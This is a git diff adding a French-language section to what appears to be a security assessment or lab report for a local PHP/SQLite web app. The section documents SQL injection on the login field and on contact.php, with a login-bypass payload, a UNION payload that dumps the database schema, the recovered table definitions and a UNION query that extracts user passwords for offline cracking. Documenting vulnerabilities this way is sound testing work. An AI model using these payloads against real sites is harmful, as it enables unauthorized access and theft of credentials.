@@ -34,7 +34,26 @@ sqlmap -u "http://localhost:8080/login.php" --batch --dbms=SQLite -D SQLite_mast
 +----+
 ```
 
+### Injection SQL
+La page de connexion est vulnérable à une "Boolean based Blind SQL Injection" sur le champ txt_login
+```sql
+' or 1=1;#
+```
 
+Il est possible de récupérer le script de création des tables sqlite, comme le site web est vulnérable à des unions attaques sur l'URL contact.php
+```sql
+'UNION select name,sql from sqlite_master;
+```
+La base de donnée donne 3 scripts de générations dont 2 nous intéresse (message, userSti, sqlite_sequence)
+```sql
+CREATE TABLE 'message' ('id' integer PRIMARY KEY AUTOINCREMENT, receiptDate DATE NOT NULL, sender integer NULL, receiver integer NULL, sujet varchar (50) NOT NULL, messageBody varchar (500) NOT NULL, CONSTRAINT fk_sender FOREIGN KEY(sender) REFERENCES userSti(id), CONSTRAINT fk_receiver FOREIGN KEY(receiver) REFERENCES userSti(id) )
+
+CREATE TABLE 'userSti' ('id' integer PRIMARY KEY AUTOINCREMENT, username varchar (50) UNIQUE NOT NULL, password varchar (255) NOT NULL, isAdmin INT(1) NOT NULL, isActive INT(1) NOT NULL )
+```
+Il est possible de récupérer les mots de passe des utilisateurs pour pouvoir les étudier dans un second temps en offline
+```sql
+'UNION select 1,password from userSti;#
+```
 
 ## Analyse de menace 
 
